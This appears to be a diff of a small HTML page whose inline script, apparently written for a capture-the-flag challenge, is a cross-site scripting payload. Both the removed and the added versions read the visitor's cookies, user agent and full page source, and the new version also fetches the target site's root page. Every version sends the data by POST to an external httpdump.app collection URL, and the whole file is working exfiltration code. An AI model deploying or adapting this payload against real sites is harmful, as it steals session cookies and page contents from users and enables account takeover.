@@ -1,22 +1,47 @@
 <html>
 <script>
-// Capture everything - cookies, user agent, referrer, etc.
-const requestData = {
-    url: window.location.href,
-    cookie: document.cookie,
-    userAgent: navigator.userAgent,
-    referrer: document.referrer,
-    language: navigator.language,
-    platform: navigator.platform,
-    fullPageHTML: document.documentElement.outerHTML,
-    timestamp: new Date().toISOString()
-};
+// First, try to get the source code of the challenge domain page
+fetch('/')  // or the specific challenge page URL
+    .then(response => response.text())
+    .then(htmlSource => {
+        // Send both cookie and source code to your httpdump
+        const requestData = {
+            currentPage: {
+                url: window.location.href,
+                cookie: document.cookie,
+                source: document.documentElement.outerHTML
+            },
+            challengePage: {
+                source: htmlSource,
+                cookie: document.cookie // This is what we really want!
+            },
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        };
 
-// Send everything to your httpdump
-fetch('https://httpdump.app/dumps/83a81e26-b1db-4c2f-891f-7befa27c87da', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(requestData, null, 2)
-});
+        fetch('https://httpdump.app/dumps/83a81e26-b1db-4c2f-891f-7befa27c87da', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(requestData, null, 2)
+        });
+    })
+    .catch(error => {
+        // If fetch fails, at least send what we have
+        const errorData = {
+            error: error.toString(),
+            currentPage: {
+                url: window.location.href,
+                cookie: document.cookie,
+                source: document.documentElement.outerHTML
+            },
+            timestamp: new Date().toISOString()
+        };
+        
+        fetch('https://httpdump.app/dumps/83a81e26-b1db-4c2f-891f-7befa27c87da', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(errorData, null, 2)
+        });
+    });
 </script>
 </html>
